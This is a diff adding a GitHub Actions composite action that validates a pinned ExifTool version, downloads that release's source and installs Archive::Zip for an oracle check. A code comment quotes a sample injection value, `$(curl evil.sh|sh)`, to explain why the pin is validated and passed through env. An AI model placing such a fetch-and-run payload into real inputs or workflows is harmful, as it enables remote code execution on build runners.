@@ -1,0 +1,53 @@
+name: Pinned ExifTool source
+description: >-
+  Resolve .exiftool-version, fetch that ExifTool release into
+  $RUNNER_TEMP/oxidex-table-oracle, export EXIFTOOL_SOURCE, and install the
+  Archive::Zip support the oracle capability probe needs. Requires a checkout.
+outputs:
+  version:
+    description: The pinned ExifTool release
+    value: ${{ steps.stamp.outputs.version }}
+runs:
+  using: composite
+  steps:
+    # The release comes from .exiftool-version, the repo-wide pin. This job
+    # used to read it from the artifact's own EXIFTOOL_VERSION stamp, on the
+    # reasoning that a version here would be a second source of truth -- but
+    # that made the check circular: a stale table set named the release it
+    # would be graded against, so it chose its own oracle and passed forever.
+    # The pin is read out of a file the pull request controls, so it is
+    # untrusted input. It is validated against a strict numeric pattern here
+    # and passed onward through env rather than `${{ }}` interpolation: a
+    # value like `$(curl evil.sh|sh)` expanded inside a run: block would be
+    # remote code execution on a fork PR.
+    - name: Resolve pinned ExifTool release
+      id: stamp
+      shell: bash
+      run: |
+        set -euo pipefail
+        V=$(tr -d '[:space:]' < .exiftool-version)
+        [ -n "$V" ] || { echo "::error::.exiftool-version is empty"; exit 1; }
+        case "$V" in
+          *[!0-9.]* | "" | .* | *.) echo "::error::refusing non-numeric ExifTool version '$V'"; exit 1 ;;
+        esac
+        echo "version=$V" >> "$GITHUB_OUTPUT"
+        echo "Repo pins ExifTool $V"
+    - name: Fetch that ExifTool source
+      shell: bash
+      env:
+        ET_VERSION: ${{ steps.stamp.outputs.version }}
+      run: |
+        set -euo pipefail
+        EXIFTOOL_SOURCE="$RUNNER_TEMP/oxidex-table-oracle"
+        echo "EXIFTOOL_SOURCE=$EXIFTOOL_SOURCE" >> "$GITHUB_ENV"
+        curl --fail --silent --show-error --location -o "$RUNNER_TEMP/exiftool-tables.tar.gz" \
+          "https://github.com/exiftool/exiftool/archive/refs/tags/${ET_VERSION}.tar.gz"
+        mkdir -p "$EXIFTOOL_SOURCE"
+        tar xzf "$RUNNER_TEMP/exiftool-tables.tar.gz" -C "$EXIFTOOL_SOURCE" --strip-components=1
+    # verify_subdirs.py probes DOCX parsing as well as the version.
+    # A Perl without Archive::Zip reports ZIP and is not a valid oracle.
+    - name: Install oracle container support
+      shell: bash
+      run: |
+        sudo cpanm --notest Archive::Zip 2>/dev/null || sudo cpan -T Archive::Zip
+        perl -MArchive::Zip -e 1
